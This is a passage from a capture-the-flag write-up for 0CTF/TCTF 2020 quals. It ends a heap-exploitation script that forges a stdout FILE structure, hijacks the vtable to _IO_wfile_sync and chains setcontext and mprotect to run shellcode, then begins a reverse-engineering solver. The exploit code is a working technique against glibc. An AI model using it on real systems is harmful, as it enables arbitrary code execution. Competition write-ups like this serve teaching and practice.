  remove(fuck[1])
  new(fuck[0],"D"*0xe8)
  payload = (p64(0x00000000fbad2887) +
              p64(libc + 0x1e57e3)*7 +
              p64(0)*7 +
              p64(0xffffffffffffffff) +
              p64(0) +
              p64(libc + 0x1e7580) +
              p64(0xffffffffffffffff) +
              p64(heap + 0x4dd0) +
              p64(heap + 0x4da0) +
              p64(0)*3 +
              p64(0x00000000ffffffff) +
              p64(0)*2 +
              p64(_IO_wfile_sync - 0x38) )
  payload = payload.ljust(0x100,"\x00")
  # Fastbin attack stdout to get stdout buffer (stdout flag is 0x000000fbxxxxxx, so 0x000000fb can use to be fastbin size).
  # Change puts stdout vtable to _IO_wfile_sync, and contorl rip & rdi
  # Jump magic and setcontext to call mportect, and finally execute shellcode
  new(fuck[1],payload[0xb:0xb+0xe8])
  r.interactive()
```
`flag{mountain_high_water_flows_16dd684fed65cc76}`


## Rev

### flash-1

script:

```python=
f=open("flash").read()

def ff(a):
  for i in range(0x10000):
    if((i*0x11) % 0xb248) == a:
       return hex(i)


tt = []

start = 0x13d72;

```

---

*Truncated at 1200 lines. Full text: <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20200627-0ctf_tctf2020quals/README.md>*
